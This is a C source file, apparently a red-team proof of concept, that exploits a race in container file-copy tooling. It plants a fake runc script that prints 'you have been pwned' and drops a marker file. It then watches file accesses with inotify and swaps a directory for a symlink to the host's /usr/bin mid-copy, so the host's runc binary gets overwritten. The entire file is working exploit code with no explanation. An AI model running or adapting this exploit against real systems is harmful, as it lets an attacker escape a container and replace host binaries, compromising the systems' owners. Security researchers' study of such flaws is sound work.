#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <poll.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

static const char *visible_file = "/watched/file.txt";
static const char *backing_file = "/watched/.file.txt.regular";
static const char *trigger_file = "/watched/file.txt/aaa.txt";
static const char *pivot_dir = "/watched/file.txt/escape";
static const char *stage_link = "/watched/file.txt/.swap-escape";
static const char *backup_dir = "/watched/file.txt/.old-escape";
static const char *host_target_dir = "/usr/bin";
static const char *host_target_file = "/usr/bin/runc";
static const int exit_quiet_ms = 250;

static void die(const char *what)
{
    perror(what);
    exit(1);
}

static uint64_t monotonic_ms(void)
{
    struct timespec ts;

    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
        die("clock_gettime");
    }
    return (uint64_t)ts.tv_sec * 1000ULL + (uint64_t)ts.tv_nsec / 1000000ULL;
}

static void mkdir_p(const char *path, mode_t mode)
{
    char tmp[PATH_MAX];
    char *p;

    if (snprintf(tmp, sizeof(tmp), "%s", path) >= (int)sizeof(tmp)) {
        fprintf(stderr, "mkdir path too long: %s\n", path);
        exit(1);
    }

    for (p = tmp + 1; *p != '\0'; p++) {
        if (*p != '/') {
            continue;
        }
        *p = '\0';
        if (mkdir(tmp, mode) != 0 && errno != EEXIST) {
            die("mkdir");
        }
        *p = '/';
    }

    if (mkdir(tmp, mode) != 0 && errno != EEXIST) {
        die("mkdir");
    }
}

static void write_text_file(const char *path, const char *text)
{
    size_t len = strlen(text);
    ssize_t written;
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);

    if (fd < 0) {
        die(path);
    }
    written = write(fd, text, len);
    if (written < 0 || (size_t)written != len) {
        close(fd);
        die("write");
    }
    if (close(fd) != 0) {
        die("close");
    }
}

static void write_repeat_file(const char *path, char fill, size_t size)
{
    static char buf[64 * 1024];
    size_t remaining = size;
    int fd;

    memset(buf, fill, sizeof(buf));

    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        die(path);
    }

    while (remaining > 0) {
        size_t chunk = remaining < sizeof(buf) ? remaining : sizeof(buf);
        ssize_t written = write(fd, buf, chunk);

        if (written < 0 || (size_t)written != chunk) {
            close(fd);
            die("write");
        }
        remaining -= chunk;
    }

    if (close(fd) != 0) {
        die("close");
    }
}

static void setup_layout(void)
{
    mkdir_p(pivot_dir, 0755);
    mkdir_p(host_target_dir, 0755);
    write_text_file(backing_file, "top-level file\n");
    write_repeat_file(trigger_file, 'B', 16 * 1024 * 1024);
    write_text_file(host_target_file, "#!/bin/bash\n echo 'you have been pwned';\ntouch /imperva_red_team;\n");
    if (chmod(host_target_file, 0755) != 0) {
        die("chmod");
    }

    if (symlink(host_target_dir, stage_link) != 0) {
        die("symlink");
    }
}

static bool try_pivot(void)
{
    if (rename(pivot_dir, backup_dir) != 0) {
        perror("rename escape -> backup");
        return false;
    }
    if (rename(stage_link, pivot_dir) != 0) {
        perror("rename staged symlink -> escape");
        return false;
    }
    printf("pivoted %s -> %s\n", pivot_dir, host_target_dir);
    fflush(stdout);
    return true;
}

static void run_monitor(void)
{
    char buf[4096];
    bool raced = false;
    uint64_t exit_deadline_ms = 0;
    int fd = inotify_init1(IN_CLOEXEC);
    struct pollfd pfd = { .fd = fd, .events = POLLIN };

    if (fd < 0) {
        die("inotify_init1");
    }

    if (inotify_add_watch(fd, visible_file, IN_OPEN | IN_ACCESS | IN_ONLYDIR) < 0) {
        die("inotify_add_watch");
    }
    if (inotify_add_watch(fd, host_target_dir, IN_OPEN | IN_ACCESS | IN_CLOSE_NOWRITE | IN_CLOSE_WRITE) < 0) {
        die("inotify_add_watch");
    }

    for (;;) {
        int timeout = -1;
        ssize_t len;
        char *ptr;

        if (raced) {
            uint64_t now = monotonic_ms();

            if (now >= exit_deadline_ms) {
                printf("copy activity went quiet, exiting\n");
                fflush(stdout);
                return;
            }
            timeout = (int)(exit_deadline_ms - now);
        }

        if (poll(&pfd, 1, timeout) < 0) {
            if (errno == EINTR) {
                continue;
            }
            die("poll");
        }

        if ((pfd.revents & POLLIN) == 0) {
            if (raced) {
                printf("copy activity went quiet, exiting\n");
                fflush(stdout);
                return;
            }
            continue;
        }

        len = read(fd, buf, sizeof(buf));
        if (len < 0) {
            if (errno == EINTR) {
                continue;
            }
            die("read");
        }
        ptr = buf;

        while (ptr < buf + len) {
            struct inotify_event *event = (struct inotify_event *)ptr;

            if (!raced &&
                (event->mask & (IN_OPEN | IN_ACCESS)) != 0 &&
                event->len > 0 &&
                strcmp(event->name, "aaa.txt") == 0) {
                raced = try_pivot();
                if (raced) {
                    exit_deadline_ms = monotonic_ms() + (uint64_t)exit_quiet_ms;
                }
            } else if (raced) {
                exit_deadline_ms = monotonic_ms() + (uint64_t)exit_quiet_ms;
            }

            ptr += sizeof(*event) + event->len;
        }
    }
}

int main(void)
{
    setup_layout();
    run_monitor();
    return 0;
}
